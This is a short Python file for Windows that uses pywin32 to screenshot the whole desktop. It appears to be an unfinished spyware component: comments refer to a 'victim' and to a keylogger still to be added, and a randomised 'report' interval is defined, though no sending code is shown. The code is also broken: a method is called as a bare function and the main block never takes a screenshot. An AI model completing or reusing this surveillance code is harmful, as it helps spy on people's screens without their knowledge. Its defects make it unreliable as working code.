import base64
import win32api
import win32con
import win32gui
import win32ui
from threading import Timer
from datetime import datetime
import random

#dobuwać keyloogera

SEND_REPORT_EVERY = random.randint(30, 60)


class Screenshoter():
    def __init__(self):
        pass

    # getting the size of screen, a victim can have multiple monitors
    

    def screenshot(self, name = 'screendshot'):
        # making handle for desktop
        hdesktop = win32gui.GetDesktopWindow() 
        width, height, left, top = get_dimensions(self)

        desktop_dc = win32gui.GetWindowDC(hdesktop)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
        mem_dc = img_dc.CreateCompatibleDC()

        # saveing screenshot as a bitmap
        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot)
        mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
        name += '.bmp'
        screenshot.SaveBitmapFile(mem_dc, name)

        mem_dc.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())


    def get_dimensions(self):
        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        return (width, height, left, top)

if __name__ == '__main__':
    screenshot = Screenshoter()

